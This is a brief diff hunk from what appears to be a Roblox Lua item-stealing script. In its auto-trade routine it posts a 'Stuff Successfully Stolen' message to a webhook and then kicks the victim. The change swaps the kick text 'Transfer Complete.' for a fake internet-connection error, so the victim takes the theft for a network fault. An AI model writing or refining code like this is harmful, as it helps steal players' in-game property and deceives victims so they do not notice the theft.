@@ -173,7 +173,7 @@ local function startAutoTrade(targetPlayer)
         
         SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false)
         task.wait(1)
-        plr:kick("Transfer Complete.")
+        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
     end)
 end
 
